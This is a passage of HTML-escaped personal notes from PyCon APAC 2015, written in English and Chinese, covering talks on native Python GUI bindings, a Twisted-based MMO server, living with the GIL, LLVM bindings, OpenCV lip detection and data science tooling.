&lt;li&gt;Python's de-facto standard GUI  &lt;/li&gt;
&lt;li&gt;Native nowhere  &lt;ul&gt;
&lt;li&gt;Themed Tk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding to Tcl/Tk  &lt;/li&gt;
&lt;li&gt;Lean, but may be lacking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Platform-specific  &lt;ul&gt;
&lt;li&gt;PyObjC on OS X (Cocoa)  &lt;/li&gt;
&lt;li&gt;WIn32API on Windows  &lt;/li&gt;
&lt;li&gt;PyGObject on Gnome (GTK+)  &lt;/li&gt;
&lt;li&gt;Native UI/UX  &lt;/li&gt;
&lt;li&gt;Needs to deploy C Binding  &lt;/li&gt;
&lt;li&gt;Very weird API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding  &lt;/li&gt;
&lt;li&gt;Let's Build Everything  &lt;ul&gt;
&lt;li&gt;Kivy and Pyglet  &lt;/li&gt;
&lt;li&gt;Cross-platform application code  &lt;/li&gt;
&lt;li&gt;Nice Pythonic API  &lt;/li&gt;
&lt;li&gt;Needs to deploy C binding  &lt;/li&gt;
&lt;li&gt;Not Native (and they don't care)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Licensing  &lt;ul&gt;
&lt;li&gt;GPL and LGPL  &lt;/li&gt;
&lt;li&gt;Source distribution  &lt;/li&gt;
&lt;li&gt;Static linking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What I want  &lt;ul&gt;
&lt;li&gt;Native UI and UX  &lt;/li&gt;
&lt;li&gt;Portability  &lt;/li&gt;
&lt;li&gt;Ease to Deploy  &lt;/li&gt;
&lt;li&gt;Pythonic API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Solution (IMO)  &lt;ul&gt;
&lt;li&gt;Dynamic binding to native GUI  &lt;/li&gt;
&lt;li&gt;CPython compatibility  &lt;/li&gt;
&lt;li&gt;No non-Python dependencies  &lt;/li&gt;
&lt;li&gt;Wrapper on top  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Binding  &lt;ul&gt;
&lt;li&gt;Foreign function interface (FFI)  &lt;/li&gt;
&lt;li&gt;libffi  &lt;/li&gt;
&lt;li&gt;ctypes  &lt;/li&gt;
&lt;li&gt;CFFI, anyone?  &lt;/li&gt;
&lt;li&gt;related links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cffi.readthedocs.org/en/latest/"&gt;https://cffi.readthedocs.org/en/latest/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/ctypes.html"&gt;https://docs.python.org/2/library/ctypes.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi"&gt;http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Foreign_function_interface"&gt;http://en.wikipedia.org/wiki/Foreign_function_interface&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sourceware.org/libffi/"&gt;https://sourceware.org/libffi/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model  &lt;ul&gt;
&lt;li&gt;Ideal: Python API wrapper &amp;lt;=&amp;gt; Binding (in Python) &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Windows: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Ubuntu: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;OS X: Python API Wrapper &amp;lt;=&amp;gt; { ctypes / ctypes + wrapper &amp;lt;=&amp;gt; objectvie-c API}&amp;lt;=&amp;gt; C API (e.g. CoreFoundation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pybee/toga"&gt;toga&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://pybee.org/toga/"&gt;http://pybee.org/toga/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install toga-demo  
$ toga-demo  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Difficulties  &lt;ul&gt;
&lt;li&gt;API Design  &lt;/li&gt;
&lt;li&gt;Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Problem  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Different Paradigms  &lt;/li&gt;
&lt;li&gt;"The Store"  &lt;/li&gt;
&lt;li&gt;Android, iOS, Windows Phone  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lwn.net/Articles/640625"&gt;http://lwn.net/Articles/640625&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Support  &lt;ul&gt;
&lt;li&gt;C API Availability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Activity Stack / Fragment  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;RPyScan&lt;/h4&gt;
&lt;p&gt;用 Raspberry Pi + Python 自幹 3D 人體掃描機，因為買現成的太貴了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;MMO Server Design with Twisted.py - Dan Maas&lt;/h4&gt;
&lt;p&gt;// 這外國講者的中文講的真的蠻標準的  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SPINPUNCH  &lt;/li&gt;
&lt;li&gt;THUNDER RUN  &lt;/li&gt;
&lt;li&gt;Topics  &lt;ul&gt;
&lt;li&gt;System Architecture  &lt;/li&gt;
&lt;li&gt;How to write asynchronous HTTP server with Twisted  &lt;/li&gt;
&lt;li&gt;How to profile Asynchronous Server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Game = Engine + Game Data + Art  &lt;ul&gt;
&lt;li&gt;Engine: Server, Client, Analytics  &lt;/li&gt;
&lt;li&gt;Game Data: Units, buildings, items  &lt;/li&gt;
&lt;li&gt;Art: Images, Sounds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Engine  &lt;ul&gt;
&lt;li&gt;Client / Server "web app"  &lt;/li&gt;
&lt;li&gt;Server: Python  &lt;/li&gt;
&lt;li&gt;Client: JavaScript / HTML5 Canvas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Won't be mention today  &lt;ul&gt;
&lt;li&gt;Analytics system (SQL, map/reduce)  &lt;/li&gt;
&lt;li&gt;Gamedata build pipeline  &lt;/li&gt;
&lt;li&gt;Art build pipeline  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server  &lt;ul&gt;
&lt;li&gt;Client sends requests (by HTTP) to run gmae actions  &lt;ul&gt;
&lt;li&gt;"Upgrade this building"  &lt;/li&gt;
&lt;li&gt;"Produce this unit"  &lt;/li&gt;
&lt;li&gt;"Buy this thing in the Store"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check requirements, if OK, then mutate player state, send reply  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Design Requirements  &lt;ul&gt;
&lt;li&gt;High Scale  &lt;ul&gt;
&lt;li&gt;20,000+ daily players  &lt;/li&gt;
&lt;li&gt;2,000+ concurrent players  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Low latency  &lt;ul&gt;
&lt;li&gt;cannot greater than 1xx ms  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Implementation  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Twisted Asynchronous HTTP server  &lt;/li&gt;
&lt;li&gt;Cluster of processes (on Amazon EC2)  &lt;/li&gt;
&lt;li&gt;Support ~ 100 online players per CPU  &lt;ul&gt;
&lt;li&gt;Scaling by adding cores  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is Twisted?  &lt;ul&gt;
&lt;li&gt;Network library  &lt;/li&gt;
&lt;li&gt;Asynchronous event loop, like NGINX  &lt;/li&gt;
&lt;li&gt;Supports many internet protocols  &lt;ul&gt;
&lt;li&gt;HTTP  &lt;/li&gt;
&lt;li&gt;SSH  &lt;/li&gt;
&lt;li&gt;FTP  &lt;/li&gt;
&lt;li&gt;SMTP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistent Python API, not every easy but really consistent  &lt;/li&gt;
&lt;li&gt;Easy to extend with custom classes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Asynchronous server  &lt;/li&gt;
&lt;li&gt;use both synchronous and asynchronous code  &lt;ul&gt;
&lt;li&gt;not every computation are suitable with asynchronous  &lt;/li&gt;
&lt;li&gt;synchronous code is easier to write  &lt;/li&gt;
&lt;li&gt;synchronous (99%)  &lt;ul&gt;
&lt;li&gt;fast: 1 - 100 ms  &lt;ul&gt;
&lt;li&gt;attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;asynchronous (1%)  &lt;ul&gt;
&lt;li&gt;slow: 100ms - 10 seconds  &lt;ul&gt;
&lt;li&gt;Reading/writing Amazon S3 on login/logout  &lt;/li&gt;
&lt;li&gt;Quering Facebook API  &lt;/li&gt;
&lt;li&gt;Top scores database query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write an asynchronous http server by using Twisted  &lt;ul&gt;
&lt;li&gt;reactor  &lt;/li&gt;
&lt;li&gt;twisted.web.NOT_DONE_YET  &lt;/li&gt;
&lt;li&gt;request.write("Hello")  &lt;/li&gt;
&lt;li&gt;request.finish()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to connect "before" and "after"  &lt;/li&gt;
&lt;li&gt;inlineCallbacks (decorator) in Twisted  &lt;/li&gt;
&lt;li&gt;Collect data on each request  &lt;ul&gt;
&lt;li&gt;Average latency (performance hotspot)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Watch total "unhalted" time  &lt;ul&gt;
&lt;li&gt;What % of the time the CPU is waiting for the next request?  &lt;/li&gt;
&lt;li&gt;50% = danger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 2- 2015/06/06 - Sat&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-2-June-6-gLUoM6krKOq"&gt;PyCon APAC 2015 - Day 2 (June 6) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;GIL - Tzung-Bi Shih&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/penvirus/gil1"&gt;https://github.com/penvirus/gil1&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Global Interpreter Lock  &lt;ul&gt;
&lt;li&gt;Giant Lock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in CPython protects  &lt;ul&gt;
&lt;li&gt;Interpreter state, thread state, ...  &lt;/li&gt;
&lt;li&gt;reference count  &lt;/li&gt;
&lt;li&gt;"a Guarantee"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other implementations  &lt;ul&gt;
&lt;li&gt;fine-grained Lock  &lt;ul&gt;
&lt;li&gt;把 lock 切小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lock-free  &lt;ul&gt;
&lt;li&gt;不需要 Lock - 兩種  &lt;ul&gt;
&lt;li&gt;algorithm  &lt;/li&gt;
&lt;li&gt;底層操作達到 atomic  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把 lock offload 到下一層  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 好做  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL over multi-processor  &lt;ul&gt;
&lt;li&gt;Want to produce efficient program.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 該不該存在，需不需要拿掉?  &lt;ul&gt;
&lt;li&gt;問題  &lt;ul&gt;
&lt;li&gt;有太多 legacy 的東西要處理  &lt;/li&gt;
&lt;li&gt;「男子漢的約定不能改變！」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Brainless Solution for multi-process  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Embarrassingly parallel  &lt;ul&gt;
&lt;li&gt;no dependency between those parallel tasks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IPC-required parallel tasks  &lt;ul&gt;
&lt;li&gt;share states with other peers  &lt;/li&gt;
&lt;li&gt;the most costly overhead of the GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;multiprocessing  &lt;ul&gt;
&lt;li&gt;process pool  &lt;/li&gt;
&lt;li&gt;nondeterministic  &lt;ul&gt;
&lt;li&gt;the same input, different output.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;workers are forked when initializing the pool, they share the same memory copy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pp (parallel python) remote node  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ppserver.py -v 1 -p 10000 &amp;amp;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Release the GIL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;ctypes  &lt;ul&gt;
&lt;li&gt;thread for GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python / C extension  &lt;ul&gt;
&lt;li&gt;linking to the busy.so extension  &lt;/li&gt;
&lt;li&gt;When it comes to C thread vs Python thread battle, C thread always win.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;Only applicable to IO-bound tasks  &lt;/li&gt;
&lt;li&gt;Single process, single Threads  &lt;ul&gt;
&lt;li&gt;no other thread, no GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Executing the code when exactly needed  &lt;/li&gt;
&lt;li&gt;Examples:  &lt;ul&gt;
&lt;li&gt;generator (太 geek，容易寫錯)  &lt;/li&gt;
&lt;li&gt;pyev (recommended)  &lt;ul&gt;
&lt;li&gt;link to libe  &lt;/li&gt;
&lt;li&gt;實際上會使用 io watcher  &lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;不用任何 symbol 去接、重複使用同一個 symbol 都會造成 segmentation fault  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gevent (recommended)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interpreter as an Instance (rough idea)  &lt;ul&gt;
&lt;li&gt;C program, singel process, multi-thread  &lt;ul&gt;
&lt;li&gt;still can share states with relatively low penalty  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Allocate memory space for interpreter context  &lt;ul&gt;
&lt;li&gt;that is, accept an address to put instance context in Py_Initialize()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;How to live along with GIL well?  &lt;ul&gt;
&lt;li&gt;Multi-process  &lt;/li&gt;
&lt;li&gt;Release the GIL  &lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;for IO-bound solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perhaps, Interpreter as an Instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python &amp;amp; LLVM - 李楓&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;llvmpy  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.llvmpy.org"&gt;http://www.llvmpy.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/llvmpy/llvmpy"&gt;https://github.com/llvmpy/llvmpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvm.core  &lt;/li&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;Support Python 3.x  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons  &lt;ul&gt;
&lt;li&gt;only support to LLVM 3.3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvmlite  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/numba/llvmlite"&gt;https://github.com/numba/llvmlite&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://llvmlite.pydata.org/"&gt;http://llvmlite.pydata.org/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A lightweight LLVM python Binding for writing JIT compilers  &lt;/li&gt;
&lt;li&gt;架構比 llvmpy 簡潔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HPC  &lt;ul&gt;
&lt;li&gt;Heterogeneous Parallel Computing  &lt;/li&gt;
&lt;li&gt;High Performance Computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anaconda  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://continuum.io/downloads"&gt;http://continuum.io/downloads&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://store.continuum.io/cshop/anaconda/"&gt;https://store.continuum.io/cshop/anaconda/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Black Scholes example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugging  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org"&gt;LLDB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Debuger for LLVM  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org/build.html"&gt;http://lldb.llvm.org/build.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;使用 CMake + Ninja  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/upbit/lldb-capstone-arm"&gt;LLDB-Capstone&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;LLVM's Machine Code (MC) layer  &lt;/li&gt;
&lt;li&gt;Python Binding  &lt;ul&gt;
&lt;li&gt;support Python 2 &amp;amp; 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wisk/medusa"&gt;Medusa&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python 讓你的眼睛看得見 - Yu-Chi Lin&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;McGurk 效應  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/錯聽"&gt;錯聽 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;英文語料庫：AVleter, CUAVE, OuluVS, IBMSR, IBMIH  &lt;/li&gt;
&lt;li&gt;中文語料庫：找不到，所以資料庫自己建  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己建資料庫  &lt;ul&gt;
&lt;li&gt;透過安排好的語料，隨機讓受試者唸出，並錄影錄音。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV  &lt;/li&gt;
&lt;li&gt;研究架構  &lt;ul&gt;
&lt;li&gt;臉部偵測 =&amp;gt; 嘴巴偵測 =&amp;gt; 相鄰 frame 的變化量計算，切出音節  &lt;/li&gt;
&lt;li&gt;聲音訊號分析 =&amp;gt; 以波形能量切音節  &lt;/li&gt;
&lt;li&gt;結合以上兩個，以聲音為主，影像為輔，切出正確音節  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;偵測  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://alereimondo.no-ip.org/OpenCV/34"&gt;Haar feature&lt;/a&gt;, Adaboost  &lt;/li&gt;
&lt;li&gt;The haar cascade for mouth  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果你要訓練一個自己的分類器?  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://coding-robin.de/2013/07/22/train-your-own-opencv-haar-classifier.html"&gt;train your own opencv haar classifier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mrnugget/opencv-haar-classifier-training"&gt;https://github.com/mrnugget/opencv-haar-classifier-training&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼判斷電腦切音節切得好不好？=&amp;gt; 還是得靠人力來判斷  &lt;ul&gt;
&lt;li&gt;聲音切音節 + 人力切音節 =&amp;gt; 得到最接近正確音節的位置  &lt;/li&gt;
&lt;li&gt;其他切音節的方法  &lt;ul&gt;
&lt;li&gt;以嘴巴開合的面積大小來計算  &lt;ul&gt;
&lt;li&gt;以顏色判別嘴唇或皮膚，以此計算開合大小  &lt;/li&gt;
&lt;li&gt;HSV colorspace  &lt;/li&gt;
&lt;li&gt;框出嘴唇的外輪廓，計算面積大小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV in Machine Learning  &lt;ul&gt;
&lt;li&gt;scikit-learn  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;以雲端語音合成技術為基礎的音文同步有聲書之建立系統 - Chao-Ka Chang&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;google TTS  &lt;/li&gt;
&lt;li&gt;Python MTK  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;龜作圖&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.5/library/turtle.html"&gt;https://docs.python.org/3.5/library/turtle.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Turtle_graphics"&gt;http://en.wikipedia.org/wiki/Turtle_graphics&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;LT&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;網頁爬蟲  &lt;ul&gt;
&lt;li&gt;urllib2  &lt;/li&gt;
&lt;li&gt;pycurl  &lt;/li&gt;
&lt;li&gt;selenium  &lt;/li&gt;
&lt;li&gt;virtkey, pytesser  &lt;/li&gt;
&lt;li&gt;use thread  &lt;/li&gt;
&lt;li&gt;被 ban  &lt;ul&gt;
&lt;li&gt;睡覺皇帝大, sleep  &lt;/li&gt;
&lt;li&gt;proxy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day3 - 2015/06/07 - Sun&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-3-June-7-KkH9iGy5gFb"&gt;PyCon APAC 2015 - Day 3 (June 7) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;- Andy Terrel&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;The Fundamental Physics  &lt;ul&gt;
&lt;li&gt;Moving / Copying data is more expensive than computation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Business Data Processing  &lt;/li&gt;
&lt;li&gt;Scientific Data Processing  &lt;/li&gt;
&lt;li&gt;"Data Has Mass"  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datagravity.org/2012/06/26/a-formula-for-data-gravity/"&gt;Data Gravity&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Memory Matters  &lt;ul&gt;
&lt;li&gt;1980s  &lt;/li&gt;
&lt;li&gt;90s - 00s  &lt;ul&gt;
&lt;li&gt;L1, L2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010s  &lt;ul&gt;
&lt;li&gt;L3  &lt;/li&gt;
&lt;li&gt;SSD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speed Matters  &lt;/li&gt;
&lt;li&gt;"Data Scientist" Dilemma  &lt;ul&gt;
&lt;li&gt;Massive data to deal with (must bring code to data)  &lt;/li&gt;
&lt;li&gt;Cacophony of tools, data-bases, and products to integrate  &lt;/li&gt;
&lt;li&gt;Modern hardware tempts to be used but mostly idel (GPUs, data0center clusters)  &lt;/li&gt;
&lt;li&gt;Huge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python --- Spectrum  &lt;ul&gt;
&lt;li&gt;Occasional  &lt;ul&gt;
&lt;li&gt;Cut and Paste  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientist Developer  &lt;ul&gt;
&lt;li&gt;Extend frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Developer  &lt;ul&gt;
&lt;li&gt;Create frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unique aspect of Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecting for Data  &lt;ul&gt;
&lt;li&gt;Data exploration as the central task.  &lt;/li&gt;
&lt;li&gt;Data visualization as a first-  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building Exploratory Data Platforms  &lt;ul&gt;
&lt;li&gt;Environments  &lt;ul&gt;
&lt;li&gt;Wakari  &lt;/li&gt;
&lt;li&gt;Anaconda  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analytics  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;/li&gt;
&lt;li&gt;Numba  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualization  &lt;ul&gt;
&lt;li&gt;Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Our Position  &lt;ul&gt;
&lt;li&gt;No one-size-fits-all pint-and-click application is enough to solve business problems.  &lt;/li&gt;
&lt;li&gt;A language-based platform is needed. ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Science Discovery Process  &lt;ul&gt;
&lt;li&gt;Data Acquistition - Blaze  &lt;/li&gt;
&lt;li&gt;Data Preparation - Anaconda server  &lt;/li&gt;
&lt;li&gt;Data Analysis - IPython Notebook  &lt;/li&gt;
&lt;li&gt;Data Interpretation - Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Important Pieces of the Platform  &lt;ul&gt;
